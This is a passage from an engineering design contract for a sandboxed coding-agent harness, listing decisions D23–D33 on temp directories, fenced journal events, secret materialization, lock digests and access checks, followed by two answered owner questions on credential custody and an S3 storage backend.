| D23 | D4's `/tmp` refusal (no `system_write_linux`, so the default grant is never asked for) is correct and stays | the agent still needs a writable temp directory, and the first real turn showed that: Claude Code aborted at `session/new` with `EACCES: permission denied, mkdir '/tmp/claude-1000'`, which reads as an adapter bug and is not one. `TMPDIR` is pointed at `<scratch>/tmp` (created **before** the launch, since a grant to a nonexistent path grants nothing — C-FC3), which keeps the `/tmp` refusal intact and improves ADR-0008's per-attempt isolation over a shared `/tmp`. Proven both ways in the container: `/tmp` unwritable under the shipped profile, `claude-1000` created successfully under `TMPDIR` | probes C-TMP1/C-TMP3, C-FC3; `TestSandboxedLaunchGetsATempDirInsideItsGrants` |
| D24 | § 4.2 gives the unit service the journal writes it needs | it does not have them. ADR-0016 § 9 admits exactly one holder of a lease fence, and a service handed a `WorkspaceID` without a `Claim` could only write unfenced — which is how a quarantined worker keeps emitting events after its lease is stolen. `UnitService` returns facts; the **turn loop** journals them (`workspace.prepared`, `sandbox.verified`, `workspace.committed`) on the fenced `AppendTurnEvent`/`WorkspaceEvent` path. Cleanup-side events (`workspace.released`, `workspace.quarantined`) go through the store's workspace writer, which is why that writer exists separately | ADR-0016 § 9, § 4.2 |
| D25 | § 4.2 step 3 materializes against "the unit's checkouts" | the materializer must **not** read `workspace_repos` for them: those rows are written *after* materialization by D6's own ordering (the exclusion set they persist must already be complete), so a table-reading materializer finds nothing and refuses every project-scoped mount. `MaterializeRequest.Repos` carries `{id,name,checkout,mirror}` from the prepared unit instead. Found live: every `env_file` mount answered `bad_shape` | exit run, worker logs 2026-10-15 09:47–09:55; `internal/worker/seams.go` `MaterializeRepo` |
| D26 | `secret.materialized` for an `env` delivery names no repository ("which repo was the env var scoped to" has no true answer) | `Materializer.Deliver`'s structural authorization still requires a repository name present in its unit, so an `env` mount *rides* the unit's first checkout for that check while the journalled row/event deliberately omit `repository_name` | ADR-0018 D4, exit run case 12 |
| D27 | C12's `secret_materializations.target` | file targets are **repo-qualified checkout-relative** paths (`backend/.env.test.local`), not bare file names and never absolute host paths; `env` targets are the env name. The same string appears in `secret.materialized`/`secret.removed`/`secret.materialization_failed` | exit run C12d, `unit_secrets.go` |
| D28 | § 4.2's `lifecycle` column carries `turn|workspace` | M3's worker removes **every** materialized file at unit end (`cleaned_by='worker'`); `workspace`-lifecycle retention across turns is an extension point the column preserves, not an M3 behavior. The startup sweep closes rows a dead worker left (`cleaned_by='startup_sweep'`) | exit run C12d/C12k, `TestUnitSecretsSweepClosesWhatADeadWorkerLeft` |
| D29 | C14b names a `workspace.staged` event | no such event exists in M3 and none is invented: the digest evidence is the on-disk lock observed **during** the turn, `sandbox.verified` for the same turn, and the refusal path (`conversation.turn.failed` naming the mismatched digest). The event remains the natural carrier when pipelines land | § 7 case 14, exit run C14b/e |
| D30 | C14a says the profile "pins" the digest | profiles have no write API (D10 — seeds are the API surface), so the exit run pins via `UPDATE agent_profiles` and the profile's `apm_lock_digest` must be the sha256 of the **post-`install --frozen`** lock bytes: apm 0.33 rewrites `apm.lock.yaml` in place (A5), and a tracked path can never be hidden by an exclude file, so `DeclareExclusions` now *skips* tracked declarations instead of failing prepare on their confirmation | APM.md A5, `TestDeclareExclusionsSkipsTrackedPaths`, exit run C14b |
| D31 | C15d's not-found-equals-invisible rule | applies to the workspaces **list** too: `GET /projects/{id}/workspaces` answers the uniform 404 for a caller outside the project, never an empty 200 that confirms the project exists | exit run C15, `m3routes_test.go`, `APIWorkspaceStore.ListWorkspaces` |
| D32 | X6/case 17 say "while both conversations are live" | the harness worker's turn loop is serial by design (one claim at a time, M2); concurrency of units on one worker is not an M3 deliverable. What M3 proves instead, and what the exit run asserts: a second conversation's workspace is a **fresh checkout that never inherits the first's uncommitted scratch** (observed live during the second turn, plus the agent's own `MARKER1-ABSENT` tool output), with distinct per-conversation run refs | exit run X6/case 17, `run_ref LIKE '<conversation>/%` |
| D33 | § 2's preview token TTL default (5 min) | the dev/harness compose pins `COMMUNICATION_PREVIEW_TOKEN_TTL=45s` on **both** replicas so the expiry arm is observable in one sleep; and because the keyring demands dir 0700 / file 0600 with one uid, the harness overlay runs API replicas *and* `keyring-init` as `HOST_UID` and has `keyring-init` fix ownership **and modes** of every shared named volume (they are born root-owned 0755) | exit run C16f, `compose.yml` keyring-init |

## 9. Open questions for the project owner — both answered (2026-10-15)

Only the two categories the brief names (production identity/IdP, Accepted-decision deviations, money).
Both were owner decisions, recorded here so the contract stays the single place a builder looks:

1. **Harness credential custody — DECIDED for the lab, still open for production, and it does not
   block M3.** Personal Claude/Codex logins are **authorized for all local and lab runs**, which is
   what every M3 observation is made with; custody of a *production* worker's harness credential
   (org API key per project, a broker, or a per-attempt copy) stays an open owner decision, because it
   is a licensing/terms question rather than a technical one (`04`'s "organization-managed,
   terms-compliant" wording; D-010/D-020). It is recorded as an explicit **GAP** in ADR-0019 Decision
   4, and the gap wording is the mitigation: `required` enforces workspace isolation and **not**
   credential isolation, and the ops page says so next to any green check. M3's exit gate is unchanged
   by this — its cross-project denial is proven over workspaces and mirrors, which was always the claim
   (`05`'s own caveat, contract D6).
2. **Budget for paid storage — DECIDED: none, and no paid dependency.** The S3-compatible conformance
   backend for dev/CI is **SeaweedFS** (Apache-2.0, single process, runs as a local container): pinned
   in `compose.yml` as `chrislusf/seaweedfs:4.48` under the optional profile `s3`, no published port,
   data in the named volume `seaweedfs`, addressed as `http://seaweedfs:8333`. ADR-0020 D7 is updated
   accordingly, and D-014 stays **Proposed** — M3 proves the service starts and answers its S3 API,
   not that `internal/artifacts/s3` conforms, because that package does not exist yet.

Everything else in this contract was decided here.
